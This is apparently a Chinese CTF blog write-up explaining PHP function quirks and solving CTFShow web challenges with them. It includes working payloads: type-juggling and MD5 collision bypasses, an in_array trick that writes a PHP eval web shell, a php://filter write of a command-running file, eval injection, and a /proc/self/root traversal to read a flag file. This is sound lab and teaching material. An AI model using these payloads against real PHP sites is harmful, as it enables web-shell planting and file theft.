---
title: CTFShow——PHP特性
date: 2021-11-28 20:10:32
updated: 2021-11-28 20:10:32
tags: [php相关]
categories: CTFshow
toc: true
---

PHP相关函数特性

<!-- more -->

### 1.intval()

![](https://i.loli.net/2021/11/29/qEUSJk7TZH8OMng.png)

![](https://i.loli.net/2021/11/29/7eTSFLgfOzjvwca.png)

```php+HTML
<?php
echo intval(42);                      // 42
echo intval(4.2);                     // 4
echo intval('42');                    // 42
echo intval('+42');                   // 42
echo intval('-42');                   // -42
echo intval(042);                     // 34
echo intval('042');                   // 42
echo intval(1e10);                    // 1410065408
echo intval('1e10');                  // 1
echo intval(0x1A);                    // 26
echo intval(42000000);                // 42000000
echo intval(420000000000000000000);   // 0
echo intval('420000000000000000000'); // 2147483647
echo intval(42, 8);                   // 42
echo intval('42', 8);                 // 34
echo intval(array());                 // 0
echo intval(array('foo', 'bar'));     // 1
?>
```

#### web89

```php
include("flag.php");
highlight_file(__FILE__);

if(isset($_GET['num'])){
    $num = $_GET['num'];
    if(preg_match("/[0-9]/", $num)){
        die("no no no!");
    }
    if(intval($num)){
        echo $flag;
    }
}
```

payload: `?num[]=1`

#### web95

```php
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==4476){
        die("no no no!");
    }
    if(preg_match("/[a-z]|\./i", $num)){
        die("no no no!!");
    }
    if(!strpos($num, "0")){
        die("no no no!!!");
    }
    if(intval($num,0)===4476){
        echo $flag;
    }
}
```

payload:`?num=+010574` or `%20010574` ,在040574前加入不影响的字符即可

### 2.md5()

#### (1) md5弱碰撞

> QNKCDZO
> 0e830400451993494058024219903391
>
> s878926199a
> 0e545993274517709034328855841020
>
> s155964671a
> 0e342768416822451524974117254469
>
> s214587387a
> 0e848240448830537924465865611904
>
> s214587387a
> 0e848240448830537924465865611904
>
> s878926199a
> 0e545993274517709034328855841020
>
> s1091221200a
> 0e940624217856561557816327384675
>
> s1885207154a
> 0e509367213418206700842008763514

以上字符串被md5加密后，都是以0e开头，在php中会认为是0的次方，所以弱比较的返回值相同

#### (2) md5强比较

md5不能处理数组，所以会返回false，比较结果就是true

#### (3)md5强碰撞

```
a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
```





### 3.in_array()

![](https://i.loli.net/2021/11/29/fD4IxvldJYOyEpV.png)

#### web99

```php
$allow = array();
for ($i=36; $i < 0x36d; $i++) { 
    array_push($allow, rand(1,$i));
}
if(isset($_GET['n']) && in_array($_GET['n'], $allow)){
    file_put_contents($_GET['n'], $_POST['content']);
} 
```

in_array没有使用严格模式，当n=1.php时，就要相当于n=1去比较，造成绕过

payload:`get:?n=1.php post:content=<?php eval($_POST['cmd']);?>`

### 4. ReflectionClass() 反射类

**ReflectionClass** 类报告了一个类的有关信息。

#### web101

```php
include("ctfshow.php");
//flag in class ctfshow;
$ctfshow = new ctfshow();
$v1=$_GET['v1'];
$v2=$_GET['v2'];
$v3=$_GET['v3'];
$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
if($v0){
    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\{|\[|\"|\'|\,|\.|\;|\?|[0-9]/", $v2)){        if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\{|\[|\"|\'|\,|\.|\?|[0-9]/", $v3)){eval("$v2('ctfshow')$v3");}} } 
```

v0是利用运算符优先级绕过去，紧接着就是构造 ctfshow 的反射类

payload:`?v1=1&v2=echo new ReflectionClass&v3=;`

### 5.call_user_func() 和 hex2bin()

![](https://i.loli.net/2021/11/29/dgTCQZ1GXKS8Dln.png)

hex2bin() 转换16进制字符串为二进制字符串

例如：16进制字符串相当于 每两位-->ASCII码值-->字符

```php
$hex = hex2bin("6578616d706c65206865782064617461");
var_dump($hex); //string(16) "example hex data"
```

#### web102

```php
$v1 = $_POST['v1'];
$v2 = $_GET['v2'];
$v3 = $_GET['v3'];
$v4 = is_numeric($v2) and is_numeric($v3);
if($v4){
    $s = substr($v2,2);
    $str = call_user_func($v1,$s);
    echo $str;
    file_put_contents($v3,$str);
}else{
    die('hacker');
} 
```

题目要求写入的内容v2是个数字，同时还会截断前两位，所以采用hex2bin()

而要找到一条php语句转成16进制字符串是不可能的，可以借由base64编码，再经过伪协议解码写入即可

`<? echo '123';`相当于`<?='123';`

根代码：

```php
$a= '<?=`cat *`;'
```

转成base64: `PD89YGNhdCAqYDs=`，去掉等号不影响base64的解码

再用bin2hex()转成16进制字符串，发现是数字字符串：`5044383959474e6864434171594473`

v2前面要补两个数字，v3要用filter协议过滤进行解码`php://filter/write=convert.base64-decode/resource=`

![](https://i.loli.net/2021/11/29/cClEV5UIOgHbXrq.png)

### 6.内置类

(1)Exception

PHP 中提供了内置的异常处理类——Exception，该类中常用的成员函数如下所示：

(2)FilesystemIterator

遍历文件用的类，见例题

```php
eval("echo new $v1($v2());"); //v1 v2只能非符号构造
```

v1可以使用该类返回目录第一个文件名

当前目录可以用：`.` `__FILE_` `getcwd()` 绝对路径`/var/www/html`

此题中v2可以用getcwd，正好出现flag文件的文件名，访问即可

### 7.GLOBALS

$GLOBALS — 引用全局作用域中可用的全部变量

一个包含了全部变量的全局组合数组。变量的名字就是数组的键。

#### web111

![](https://i.loli.net/2021/11/30/F6UPcGW2qxAu8M1.png)

这里v1承担中介的变量，要将含有flag的变量覆盖到v1上，首先想到v2=flag，测试发现返回结果是NULL

> 注意此处 `&$v2`只是将v2的字符串传到函数里，而真正的flag变量在函数外部，无法访问

此时令`v2=GLOBALS`，即可让v1打印出当前全部的全局变量

### 8.is_file()

该函数是支持URL包装器的,但当传入的是filter协议时，返回false

```php
is_file('index.php') //false
is_file('php://filter/resource=index.php') //false
//也可以用其他协议或者目录溢出
if_file('compress.zlib://index.php')
?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/p
roc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/pro
c/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/
self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/se
lf/root/proc/self/root/var/www/html/flag.php
```

### 9.is_numeric() & trim()

#### web115

- `is_numeric()`在数字字符串前加空格是返回true的
- `trim()`并没有过滤`%0c`,0x0c是换页键
- `'%0c36'=='36'`

![](https://i.loli.net/2021/12/02/SYdauqxRse6FJ5C.png)









### 其它

#### 1.浮点数和整数弱比较和强比较

```php
<?php
    var_dump(1.0==1);//true
    var_dump(1.0===1);//false
?>
```

#### 2. and 和 &&  or 和 ||

and、=、&&的优先级为&& > = > and，第一行其实是赋值true给a，后面被忽略,同样 || > = > or

```php
$a=true and false and false;
var_dump($a);  返回true

$a=true && false && false;
var_dump($a);  返回false
```

